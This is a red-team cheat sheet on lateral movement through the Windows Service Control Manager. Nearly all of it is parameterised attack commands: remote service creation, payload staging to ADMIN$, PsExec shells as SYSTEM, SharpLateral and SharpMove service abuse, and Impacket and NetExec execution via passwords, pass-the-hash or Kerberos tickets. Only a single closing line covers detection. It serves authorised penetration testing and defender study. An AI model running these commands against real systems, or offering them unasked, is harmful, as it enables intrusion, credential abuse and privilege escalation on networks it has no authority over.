---
technique: PsExec and SCM
category: lateral-movement
targets: Windows Workstation, Windows Server
protocols: SMB, MSRPC, SVCCTL
remote_capable: true
tags: windows smb msrpc svcctl psexec smbexec lateral-movement
---

# PsExec and SCM

PsExec-style movement abuses the Service Control Manager over SMB and MSRPC to create, modify, start, or remove a service on a remote host. It is noisy, reliable, and common when the account has local administrator rights.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Network access | TCP 445 and RPC service control access must be reachable |
| Credentials | The account must have local administrator rights on the target |
| Admin share | PsExec-style tools commonly need ADMIN$ access |

## Windows

### Create remote service

#cmd #native #svcctl

Create a demand-start service that runs a command on the remote host.

```cmd title:"Create remote service command"
sc.exe \\$rhost_name create $service_name binPath= "$command" start= demand
```
<!-- cheat
var rhost_name
var service_name
var command
-->

### Start remote service

#cmd #native #svcctl

Start a remote service after creating or modifying it.

```cmd title:"Start remote service"
sc.exe \\$rhost_name start $service_name
```
<!-- cheat
var rhost_name
var service_name
-->

### Delete remote service

#cmd #native #svcctl

Remove the service after execution.

```cmd title:"Delete remote service"
sc.exe \\$rhost_name delete $service_name
```
<!-- cheat
var rhost_name
var service_name
-->

### Copy payload to ADMIN$

#cmd #native #smb

Stage a payload in the remote Windows directory through the admin share.

```cmd title:"Copy payload to remote ADMIN share"
copy "$payload_path" "\\$rhost_name\ADMIN$\Temp\$payload_file"
```
<!-- cheat
var payload_path
var rhost_name
var payload_file
-->

### PsExec as SYSTEM

#cmd #psexec

Open a command shell as SYSTEM on the target.

```cmd title:"Run PsExec as SYSTEM"
PsExec64.exe -accepteula \\$rhost_name -s -i cmd.exe
```
<!-- cheat
var rhost_name
-->

### PsExec with password

#cmd #psexec #password

Run a command with explicit domain credentials.

```cmd title:"Run PsExec with domain credentials"
PsExec64.exe -accepteula \\$rhost_name -u $domain\$user -p "$pass" cmd.exe /c "$command"
```
<!-- cheat
var rhost_name
var domain
var user
var pass
var command
-->

### PsExec custom service name

#cmd #psexec

Run PsExec with an operator-selected service name.

```cmd title:"Run PsExec with custom service name"
PsExec64.exe -accepteula \\$rhost_name -r $service_name -s cmd.exe /c "$command"
```
<!-- cheat
var rhost_name
var service_name
var command
-->

### SharpLateral service execution

#cmd #sharplateral #svcctl

Run a payload through SharpLateral service execution.

```cmd title:"Execute payload with SharpLateral redexec"
SharpLateral.exe redexec $rhost_name $payload_path $payload_file $service_name
```
<!-- cheat
var rhost_name
var payload_path
var payload_file
var service_name
-->

### SharpMove modify service

#cmd #sharpmove #svcctl

Modify a service to point at a payload or command.

```cmd title:"Modify remote service with SharpMove"
SharpMove.exe action=modsvc computername=$rhost_name command="$command" amsi=true servicename=$service_name
```
<!-- cheat
var rhost_name
var command
var service_name
-->

### SharpMove start service

#cmd #sharpmove #svcctl

Start a service after SharpMove modifies it.

```cmd title:"Start remote service with SharpMove"
SharpMove.exe action=startservice computername=$rhost_name servicename=$service_name
```
<!-- cheat
var rhost_name
var service_name
-->

## Linux

### Impacket psexec password

#impacket #psexec #password

Create a service and get command execution with password authentication.

```sh title:"Run Impacket psexec with password"
psexec.py "$domain/$user:$pass@$rhost_name" "$command"
```
<!-- cheat
var domain
var user
var pass
var rhost_name
var command
-->

### Impacket psexec hash

#impacket #psexec #pth

Create a service and get command execution with NT hash authentication.

```sh title:"Run Impacket psexec with NT hash"
psexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user@$rhost_name" "$command"
```
<!-- cheat
var nt_hash
var domain
var user
var rhost_name
var command
-->

### Impacket psexec Kerberos

#impacket #psexec #kerberos

Create a service and get command execution with an existing Kerberos ticket.

```sh title:"Run Impacket psexec with Kerberos"
psexec.py -k -no-pass -dc-ip "$rhost_ip" "$domain/$user@$rhost_fqdn" "$command"
```
<!-- cheat
var rhost_ip
var domain
var user
var rhost_fqdn
var command
-->

### Impacket smbexec password

#impacket #smbexec #password

Run commands through a service-backed SMBExec shell.

```sh title:"Run Impacket smbexec with password"
smbexec.py "$domain/$user:$pass@$rhost_name"
```
<!-- cheat
var domain
var user
var pass
var rhost_name
-->

### Impacket smbexec hash

#impacket #smbexec #pth

Run SMBExec with NT hash authentication.

```sh title:"Run Impacket smbexec with NT hash"
smbexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user@$rhost_name"
```
<!-- cheat
var nt_hash
var domain
var user
var rhost_name
-->

### NetExec psexec method

#netexec #psexec #password

Run a command through NetExec with the PsExec backend.

```sh title:"Run NetExec with PsExec method"
nxc smb "$rhost_name" -u "$user" -p "$pass" -x "$command" --exec-method psexec
```
<!-- cheat
var rhost_name
var user
var pass
var command
-->

### NetExec smbexec method

#netexec #smbexec #pth

Run a command through NetExec with the SMBExec backend and NT hash auth.

```sh title:"Run NetExec with SMBExec method"
nxc smb "$rhost_name" -u "$user" -H "$nt_hash" -x "$command" --exec-method smbexec
```
<!-- cheat
var rhost_name
var user
var nt_hash
var command
-->

## Detection

Watch for remote service creation, service binary path changes, ADMIN$ writes, named pipes associated with PsExec clones, and Event ID 7045 on targets.
